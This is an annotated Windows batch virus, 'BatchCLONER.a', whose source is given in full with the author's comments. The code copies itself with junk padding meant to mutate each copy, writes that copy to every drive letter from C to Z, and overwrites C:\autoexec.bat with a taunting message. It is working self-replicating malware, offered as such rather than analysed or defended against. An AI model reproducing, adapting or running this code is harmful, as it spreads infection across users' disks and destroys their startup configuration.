::
:: BatchCLONER.a [DvL] on 10.08.2003
::
%random%
::
:: ^ for windozeXP random fake bytes
::
@echo off
cls
@ver|find "XP"|if errorlevel 1 ctty nul|if not errorlevel 1 exit
cls
::
:: ^ checking for winXP, if found the virus exits
::
@type %0>sex.bat
@echo.>>sex.bat
@echo.>>sex.bat
@dir>>sex.bat
@echo.>>sex.bat
@echo.>>sex.bat
@ver|time>>sex.bat
@echo.>>sex.bat
@echo.>>sex.bat
@ver|date>>sex.bat
@echo.>>sex.bat
@echo.>>sex.bat
@echo.cls>>sex.bat
::
:: ^ the mutamorphic with trash part of the virus
::
@echo y|for %%d in (z:\,y:\,x:\,w:\,v:\,u:\,t:\,s:\,r:\,q:\,p:\,o:\,n:\,m:\,l:\,k:\,j:\,i:\,h:\,g:\,f:\,e:\,d:\,c:\) do copy sex.bat %%d >nul
::
:: ^ cloning the virus on all disks
::
@echo.@echo                It will get on all your disks>c:\autoexec.bat
@echo.@echo                It will infiltrate your chips>>c:\autoexec.bat
@echo.@echo                It will stick to you like glue>>c:\autoexec.bat
@echo.@echo                It will modify ram too>>c:\autoexec.bat
@echo.@echo                Yes, ... it`z BatchCLONER.a [Dvl]>>c:\autoexec.bat
::
:: ^ payload for autoexec.bat from the old & original CLONER virus
::
cls